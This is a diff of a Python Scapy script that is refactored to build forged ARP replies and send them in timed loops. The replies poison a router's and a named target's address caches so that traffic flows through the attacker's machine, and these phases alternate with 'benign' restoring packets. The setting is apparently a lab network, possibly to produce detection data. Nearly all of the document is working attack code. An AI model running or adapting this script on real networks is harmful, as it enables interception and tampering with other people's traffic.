@@ -26,48 +26,45 @@ targets_info = {
     'Sina':  {'target_ip':'10.21.0.18','target_mac':'B2:DA:BF:0C:ED:AB', 'router_mac': '82:FB:46:AA:C6:E3'}
 }
 
-def victim_clean_benign(attacker_interface, target_mac, target_ip, router_mac):
-
+def create_benign_packets(target_mac, target_ip, router_mac):
     ## WHO IS Router? Tell Target
-    arppktA = Ether()/ARP()
-    arppktA[ARP].hwsrc = target_mac
-    arppktA[ARP].psrc = target_ip
-    arppktA[ARP].pdst = "10.21.0.5"
-    arppktA[Ether].hwdst = "FF:FF:FF:FF:FF:FF"
-    arppktA[ARP].op = 1
-    sendp(arppktA, iface=attacker_interface, verbose=0)
+    benign_arp_router = Ether()/ARP()
+    benign_arp_router[ARP].hwsrc = target_mac
+    benign_arp_router[ARP].psrc = target_ip
+    benign_arp_router[ARP].pdst = "10.21.0.5"
+    benign_arp_router[Ether].hwdst = "FF:FF:FF:FF:FF:FF"
+    benign_arp_router[ARP].op = 1
 
     ## WHO IS Target? Tell Router
-    arppktB = Ether()/ARP()
-    arppktB[ARP].hwsrc = router_mac
-    arppktB[ARP].psrc = "10.21.0.5" 
-    arppktB[ARP].pdst = target_ip
-    arppktB[Ether].hwdst = "FF:FF:FF:FF:FF:FF"
-    arppktB[ARP].op = 1
-    sendp(arppktB, iface=attacker_interface, verbose=0)
+    benign_arp_target = Ether()/ARP()
+    benign_arp_target[ARP].hwsrc = router_mac
+    benign_arp_target[ARP].psrc = "10.21.0.5" 
+    benign_arp_target[ARP].pdst = target_ip
+    benign_arp_target[Ether].hwdst = "FF:FF:FF:FF:FF:FF"
+    benign_arp_target[ARP].op = 1
 
+    return benign_arp_router, benign_arp_target
 
-def attacker(attacker_interface, attacker_mac, target_mac, target_ip, router_mac):
-    ## Poison Router: Tell the router Target --> US
-    arppktC = Ether()/ARP()
-    arppktC[ARP].hwsrc = attacker_mac
-    arppktC[ARP].psrc = target_ip
-    arppktC[ARP].pdst = "10.21.0.5" 
-    arppktC[Ether].hwdst = router_mac
-    arppktC[ARP].op = 2
-    sendp(arppktC, iface=attacker_interface, verbose=0)
+def create_arp_poison_packets(attacker_mac, target_mac, target_ip, router_mac):
+    ## Poison Router: Tell The Router Target --> US
+    attacker_poison_router = Ether()/ARP()
+    attacker_poison_router[ARP].hwsrc = attacker_mac
+    attacker_poison_router[ARP].psrc = target_ip
+    attacker_poison_router[ARP].pdst = "10.21.0.5" 
+    attacker_poison_router[Ether].hwdst = router_mac
+    attacker_poison_router[ARP].op = 2
 
-    ## Poison Router: Tell the router Target --> US
-    arppktC = Ether()/ARP()
-    arppktC[ARP].hwsrc = attacker_mac
-    arppktC[ARP].psrc = "10.21.0.5"
-    arppktC[ARP].pdst = target_ip
-    arppktC[Ether].hwdst = target_mac
-    arppktC[ARP].op = 2
-    sendp(arppktC, iface=attacker_interface, verbose=0)
+    ## Poison Target: Tell Target Router --> US
+    attacker_poison_target = Ether()/ARP()
+    attacker_poison_target[ARP].hwsrc = attacker_mac
+    attacker_poison_target[ARP].psrc = "10.21.0.5"
+    attacker_poison_target[ARP].pdst = target_ip
+    attacker_poison_target[Ether].hwdst = target_mac
+    attacker_poison_target[ARP].op = 2
 
+    return attacker_poison_router, attacker_poison_target
 
-def run_program(run_time_minutes, attacker_interface, attacker_mac, target_mac, target_ip, router_mac):
+def run_program(run_time_minutes, attacker_interface, benign_arp_router, benign_arp_target, attacker_poison_router, attacker_poison_target):
     end_time_global = time.time() + run_time_minutes * 60
     print("Program stops at " + str(datetime.fromtimestamp(end_time_global)))
 
@@ -76,9 +73,13 @@ def run_program(run_time_minutes, attacker_interface, attacker_mac, target_mac, 
         duration = random.uniform(2, 5)
         end_time_attacker = datetime.now() + timedelta(minutes=duration)
 
+        time.sleep(6)
+
         print("Arp Poisoning started at " + str(datetime.fromtimestamp(time.time())) + " for " + str(duration) + " minutes")
         while datetime.now() < end_time_attacker: #while loop that runs for the duration of the attack
-            attacker(attacker_interface, attacker_mac, target_mac, target_ip, router_mac)
+            sendp(attacker_poison_router, iface=attacker_interface, verbose=0)
+            sendp(attacker_poison_target, iface=attacker_interface, verbose=0)
+            
             time.sleep(3)
         print("Arp Poisoning done")
         time.sleep(3)
@@ -86,15 +87,16 @@ def run_program(run_time_minutes, attacker_interface, attacker_mac, target_mac, 
         duration = random.uniform(2, 5)
         end_time_clean_benign = datetime.now() + timedelta(minutes=duration)
 
-        print("Cleaned up/ Benign Arp started at " + str(datetime.fromtimestamp(time.time())) + " for " + str(duration) + " minutes")
+        print("Cleaned up / Benign Arp started at " + str(datetime.fromtimestamp(time.time())) + " for " + str(duration) + " minutes")
         while datetime.now() < end_time_clean_benign: #while loop that runs for the duration of clean up / benign arp
-            victim_clean_benign(attacker_interface, target_mac, target_ip, router_mac)
+            sendp(benign_arp_router, iface=attacker_interface, verbose=0)
+            sendp(benign_arp_target, iface=attacker_interface, verbose=0)
             time.sleep(3)
-        print("Cleaned up/ Benign Arp done")
-        time.sleep(3)
+        print("Cleaned up / Benign Arp done")
 
     print("Program finished at " + str(datetime.fromtimestamp(time.time())))
-    victim_clean_benign(attacker_interface, target_mac, target_ip, router_mac)
+    sendp(benign_arp_router, iface=attacker_interface, verbose=0)
+    sendp(benign_arp_target, iface=attacker_interface, verbose=0)
     sys.exit(0)
 
 
@@ -136,8 +138,9 @@ def main():
         target_ip = targets_info['Sina']['target_ip']
         router_mac = targets_info['Sina']['router_mac']
 
-
-    run_program(run_time_minutes, attacker_interface, attacker_mac, target_mac, target_ip, router_mac)
+    benign_arp_router, benign_arp_target = create_benign_packets(target_mac, target_ip, router_mac)
+    attacker_poison_router, attacker_poison_target = create_arp_poison_packets(attacker_mac, target_mac, target_ip, router_mac)
+    run_program(run_time_minutes, attacker_interface, benign_arp_router, benign_arp_target, attacker_poison_router, attacker_poison_target)
 
 # Entry point
 if __name__ == "__main__":
